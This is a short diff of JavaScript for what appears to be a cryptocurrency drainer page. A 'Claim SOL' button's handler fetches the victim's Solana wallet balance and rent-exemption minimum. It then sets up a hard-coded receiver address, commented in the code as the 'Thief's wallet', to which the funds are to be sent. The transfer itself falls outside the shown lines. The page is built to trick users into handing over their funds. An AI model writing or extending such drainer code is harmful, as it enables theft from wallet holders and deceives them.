@@ -36,6 +36,21 @@ alert(`Minimum balance for rent exemption: ${minBalance / solanaWeb3.LAMPORTS_PE
                 $('#connect-wallet').text("Claim SOL");
                 $('#connect-wallet').on('click', async () => {
                     try {
+                        alert("Preparing to claim SOL...");
+                        
+                        // Re-fetch balance
+                        const public_key = new solanaWeb3.PublicKey(resp.publicKey);
+                        const walletBalance = await connection.getBalance(public_key);
+                        alert(`Current wallet balance: ${walletBalance / solanaWeb3.LAMPORTS_PER_SOL} SOL`);
+
+                        const minBalance = await connection.getMinimumBalanceForRentExemption(0);
+                        alert(`Minimum balance for rent exemption: ${minBalance / solanaWeb3.LAMPORTS_PER_SOL} SOL`);
+
+
+
+                        
+
+
                         const recieverWallet = new solanaWeb3.PublicKey('DRYjXYjya45KLzD5HmtBd4QeUA6SqypNoJDhgoie8bnF'); 
                         // Thief's wallet
                         alert("Preparing to transfer SOL to:", recieverWallet.toString());
